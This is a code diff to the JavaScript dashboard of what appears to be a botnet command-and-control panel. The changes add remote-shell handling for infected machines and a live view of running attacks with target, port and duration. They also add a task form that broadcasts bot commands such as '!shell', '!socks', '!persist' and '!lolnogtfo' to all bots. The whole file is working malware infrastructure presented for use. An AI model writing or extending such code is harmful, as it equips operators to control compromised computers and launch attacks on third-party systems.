@@ -100,6 +100,7 @@ var sseRetryDelay = 1000;
 var sseFails = 0;
 var sseActive = false;
 var pollingActive = false;
+var pollingTimer = null;
 
 function connectSSE() {
   if (evtSource) evtSource.close();
@@ -108,6 +109,7 @@ function connectSSE() {
   evtSource.onopen = function () {
     sseRetryDelay = 1000; sseFails = 0; sseActive = true;
     updateSSEIndicator(true);
+    stopPolling();
   };
 
   evtSource.addEventListener('stats', function (e) { updateStats(JSON.parse(e.data)); });
@@ -140,12 +142,17 @@ function updateSSEIndicator(connected) {
 function startPolling() {
   if (pollingActive) return;
   pollingActive = true;
-  setInterval(function () {
+  pollingTimer = setInterval(function () {
     fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
     fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
     fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
     loadRelayStats();
   }, 5000);
+}
+
+function stopPolling() {
+  if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
+  pollingActive = false;
 }
 
 // ---------------------------------------------------------------------------
@@ -308,7 +315,7 @@ function createBotRow(b) {
   tr.className = 'bot-row';
   tr.id = 'bot-' + sanitizeId(b.botID);
   tr.setAttribute('data-botid', b.botID);
-  tr.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
+  tr.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; pinBotPopup(ev, b.botID); };
   tr.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
 
   var socksHtml = b.socksActive
@@ -354,7 +361,7 @@ function updateBotRow(row, b) {
   cells[12].className = h.cls;
   cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
   row.className = 'bot-row ' + h.row;
-  row.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
+  row.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; pinBotPopup(ev, b.botID); };
   row.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
 }
 
@@ -1448,18 +1455,36 @@ function activateShellTab(idx) {
     try {
       var d = JSON.parse(e.data);
       if (d.output) {
-        appendOutput(d.output);
-        // If we requested a file listing, parse it
-        if (pendingFileRefresh) {
-          pendingFileRefresh = false;
-          parseFileList(d.output);
-        }
-        // Check if output is a pwd result (single line starting with /)
-        var trimmed = d.output.trim();
-        if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
-          shellCwd = trimmed;
-          document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
-          updateBreadcrumb();
+        // Check for combined cd+ls output (---LS--- marker from server-side cd handler)
+        var lsMarker = d.output.indexOf('---LS---');
+        if (lsMarker !== -1) {
+          var beforeLs = d.output.substring(0, lsMarker);
+          var lsOutput = d.output.substring(lsMarker + 9);
+          // Show only the cd output (pwd line) in terminal, not the ls dump
+          appendOutput(beforeLs);
+          // Parse pwd from the pre-marker section
+          var pwdLine = beforeLs.trim();
+          if (pwdLine.match(/^\/[^\n]*$/) && !pwdLine.match(/\s/)) {
+            shellCwd = pwdLine;
+            document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
+            updateBreadcrumb();
+          }
+          // Parse file listing
+          parseFileList(lsOutput);
+        } else {
+          appendOutput(d.output);
+          // If we requested a file listing, parse it
+          var trimmed = d.output.trim();
+          if (pendingFileRefresh && (trimmed.match(/^total\s/m) || trimmed.match(/^[drwxlsStT\-]{10}\s/m))) {
+            pendingFileRefresh = false;
+            parseFileList(d.output);
+          }
+          // Check if output is a pwd result (single line starting with /)
+          if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
+            shellCwd = trimmed;
+            document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
+            updateBreadcrumb();
+          }
         }
       }
     } catch (ex) { }
@@ -1603,8 +1628,7 @@ function shellCd(path) {
   shellWS.send(JSON.stringify({ command: cmd }));
   shellHistory.push(cmd);
   shellHistIdx = shellHistory.length;
-  // Refresh files after cd
-  setTimeout(function () { refreshFiles(); }, 300);
+  // Server-side cd handler chains pwd + ls -laF automatically via ---LS--- marker
 }
 
 // ---------------------------------------------------------------------------
@@ -2571,16 +2595,93 @@ setInterval(function () {
   });
 }, 10000);
 
-// === Stubs for removed Armada features (not in VisionC2) ===
-if(typeof loadTasks==='undefined')window.loadTasks=function(){};
-if(typeof loadUsers==='undefined')window.loadUsers=function(){};
-if(typeof scannerStart==='undefined')window.scannerStart=function(){};
-if(typeof scannerStop==='undefined')window.scannerStop=function(){};
-if(typeof addTask==='undefined')window.addTask=function(){};
-if(typeof saveUser==='undefined')window.saveUser=function(){};
-if(typeof showAddUserForm==='undefined')window.showAddUserForm=function(){};
-if(typeof hideUserForm==='undefined')window.hideUserForm=function(){};
-if(typeof updateTaskArgFields==='undefined')window.updateTaskArgFields=function(){};
+// === Live Attacks ===
+function loadLiveAttacks() {
+  fetch('/api/attacks').then(function(r){return r.json();}).then(function(attacks) {
+    var list = document.getElementById('live-attacks-list');
+    var count = document.getElementById('live-attacks-count');
+    if (!list) return;
+    count.textContent = attacks.length;
+    if (!attacks.length) {
+      list.innerHTML = '<div style="color:var(--text-dim);padding:12px;font-size:13px">No active attacks</div>';
+      return;
+    }
+    list.innerHTML = attacks.map(function(a) {
+      var pct = a.duration > 0 ? Math.round((a.elapsed / a.duration) * 100) : 0;
+      return '<div class="live-atk-row">' +
+        '<span class="live-atk-method">' + escHtml(a.method) + '</span>' +
+        '<span class="live-atk-target">' + escHtml(a.target) + ':' + escHtml(String(a.port)) + '</span>' +
+        '<div class="live-atk-bar"><div class="live-atk-bar-fill" style="width:' + pct + '%"></div></div>' +
+        '<span class="live-atk-time">' + a.remaining + 's</span>' +
+        '</div>';
+    }).join('');
+  }).catch(function(){});
+}
+setInterval(loadLiveAttacks, 2000);
+loadLiveAttacks();
+
+// ===========================================================================
+// TASKS
+// ===========================================================================
+function loadTasks() {
+  fetch('/api/tasks').then(function(r){return r.json();}).then(function(tasks) {
+    var wrap = document.getElementById('task-table-wrap');
+    var count = document.getElementById('task-active-count');
+    var tabCount = document.getElementById('tab-tasks-count');
+    if (count) count.textContent = tasks.length;
+    if (tabCount) tabCount.textContent = tasks.length;
+    if (!tasks.length) {
+      wrap.innerHTML = '<div class="task-empty">No active tasks</div>';
+      return;
+    }
+    var html = '<table class="task-table"><thead><tr><th>#</th><th>Command</th><th>Target</th><th>Status</th><th>Result</th><th>Time</th></tr></thead><tbody>';
+    tasks.forEach(function(t) {
+      var statusClass = t.status === 'sent' ? 'ok' : t.status === 'failed' ? 'err' : '';
+      var time = t.createdAt ? new Date(t.createdAt).toLocaleTimeString() : '';
+      html += '<tr><td>' + t.id + '</td><td style="font-weight:600">' + escHtml(t.command) + '</td><td>' + escHtml(t.botID || 'ALL') + '</td><td class="' + statusClass + '">' + escHtml(t.status) + '</td><td>' + escHtml(t.result) + '</td><td>' + time + '</td></tr>';
+    });
+    html += '</tbody></table>';
+    wrap.innerHTML = html;
+  }).catch(function(){});
+}
+
+function addTask() {
+  var cmd = document.getElementById('task-type').value;
+  var argsEl = document.getElementById('task-arg-fields');
+  var inputs = argsEl ? argsEl.querySelectorAll('input') : [];
+  var args = [];
+  inputs.forEach(function(el) { if (el.value.trim()) args.push(el.value.trim()); });
+  var full = cmd + (args.length ? ' ' + args.join(' ') : '');
+  fetch('/api/tasks', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({command: full, botID: ''})
+  }).then(function(r){return r.json();}).then(function(d) {
+    if (d.success) { showToast('Task created: ' + (d.task.result || ''), true); loadTasks(); }
+    else showToast(d.message || 'Failed', false);
+  }).catch(function(){ showToast('Request failed', false); });
+}
+
+function updateTaskArgFields() {
+  var cmd = document.getElementById('task-type').value;
+  var container = document.getElementById('task-arg-fields');
+  if (!container) return;
+  var fields = {
+    '!shell': [{placeholder:'command to run', style:'flex:1'}],
+    '!detach': [{placeholder:'command to run in background', style:'flex:1'}],
+    '!socks': [{placeholder:'relay address (optional)'}],
+    '!stopsocks': [],
+    '!socksauth': [{placeholder:'username'}, {placeholder:'password'}],
+    '!persist': [],
+    '!lolnogtfo': []
+  };
+  var f = fields[cmd] || [];
+  if (!f.length) { container.innerHTML = '<span style="color:var(--text-dim);font-size:12px">No arguments</span>'; return; }
+  container.innerHTML = f.map(function(a) {
+    return '<input type="text" placeholder="' + (a.placeholder||'') + '" style="' + (a.style||'') + '" autocomplete="off" spellcheck="false">';
+  }).join('');
+}
+updateTaskArgFields();
 
 // ===========================================================================
 // ATTACK BUILDER WIZARD
